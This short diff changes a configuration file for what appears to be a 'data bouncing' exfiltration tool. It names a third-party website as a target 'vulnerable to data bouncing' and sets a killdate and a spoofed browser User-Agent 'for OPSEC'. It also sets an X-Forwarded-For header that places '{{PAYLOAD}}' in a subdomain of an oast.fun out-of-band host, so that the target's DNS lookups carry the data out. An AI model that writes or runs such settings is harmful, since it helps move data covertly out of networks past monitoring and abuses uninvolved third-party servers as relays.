@@ -1,3 +1,12 @@
-target_url = "https://newsweek.com"
-exfil_header = "'X-Forwarded-For': '{{PAYLOAD}}.kxctzbmczuslqxjntjrd0tboe8q8i6fqw.oast.fun'"
-killdate_timestamp = "1752514839"
+# Killdate timestamp
+killdate_timestamp = 1752514839
+
+# Target host vulnerable to data bouncing
+target_url = "https://polarisoffice.com"
+
+# Headers to be used on the request
+[headers]
+# User Agent for OPSEC
+User-Agent = "Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
+# Example of a header for bouncing
+"X-Forwarded-For" = "{{PAYLOAD}}.kxctzbmczuslqxjntjrdsbk7rarsk8o45.oast.fun"
